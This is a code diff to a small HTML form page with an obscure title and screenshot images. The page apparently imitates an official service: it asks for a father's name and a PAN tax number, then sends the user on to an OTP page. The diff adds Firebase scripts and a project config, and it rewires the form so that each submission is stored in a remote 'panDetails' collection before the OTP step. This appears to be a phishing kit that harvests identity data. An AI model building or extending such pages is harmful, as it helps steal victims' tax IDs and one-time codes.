@@ -3,6 +3,11 @@
 <head>
   <title>dehijlbrd</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
   <style>
     html, body {
       margin: 0;
@@ -97,7 +102,7 @@
   <img src="https://i.ibb.co/vvzRc4ws/Screenshot-2025-04-20-08-31-47-89-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Meri Tasveer">
 
   <div class="form-container">
-    <form onsubmit="return validatePAN()">
+    <form onsubmit="return submitFormToFirestore()">
       <div class="form-group">
         <label for="father">Father Name *</label>
         <input type="text" id="father" name="father" required>
@@ -117,6 +122,22 @@
     <img class="bottom-image" src="https://i.ibb.co/q3n4tF60/Screenshot-2025-04-20-09-17-33-68-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
   </div>
 
+  <!-- Firebase Initialization -->
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
+      authDomain: "dlhiljbrd.firebaseapp.com",
+      projectId: "dlhiljbrd",
+      storageBucket: "dlhiljbrd.firebasestorage.app",
+      messagingSenderId: "981951131769",
+      appId: "1:981951131769:web:6ba4d6bfa570ffa62664a8"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+  </script>
+
+  <!-- Form Logic -->
   <script>
     const panInput = document.getElementById("pan");
     const panError = document.getElementById("panError");
@@ -139,8 +160,24 @@
 
     function submitIfValid() {
       if (validatePAN()) {
-        window.location.href = "otp4.html";
+        const father = document.getElementById("father").value.trim();
+        const pan = panInput.value.trim().toUpperCase();
+
+        db.collection("panDetails").add({
+          father: father,
+          pan: pan,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        }).then(() => {
+          window.location.href = "otp4.html";
+        }).catch((error) => {
+          alert("Error saving data: " + error.message);
+        });
       }
+    }
+
+    function submitFormToFirestore() {
+      submitIfValid();
+      return false;
     }
   </script>
 </body>
